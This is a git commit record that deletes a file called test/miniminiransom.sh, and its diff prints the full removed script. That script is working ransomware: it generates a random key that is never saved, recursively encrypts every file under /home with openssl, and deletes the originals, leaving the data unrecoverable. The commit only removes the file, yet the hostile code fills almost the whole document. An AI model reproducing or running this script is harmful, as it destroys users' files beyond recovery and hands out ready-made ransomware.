73c4449fe9c149f9f84c3a4b33fc58a10ad39461
SlyWildchild <70850512+SlyWildchild@users.noreply.github.com>
2023-12-19 22:30:29 +0100

    Delete test/miniminiransom.sh

--- test/miniminiransom.sh
+++
@@ -1,5 +0,0 @@
-#!/bin/bash
-key=$(tr -cd '[:alnum:]' < /dev/urandom | fold -w30 | head -n1)
-encfile() { [ "${1##*.}" != "aes" ] && openssl aes-256-cbc -a -salt -in "$1" -out "$1.aes" -k "$key" -iter 1000 && rm "$1"; }
-encdir() { for f in "$1"/*; do [ -f "$f" ] && encfile "$f"; [ -d "$f" ] && encdir "$f"; done; }
-encdir "/home"
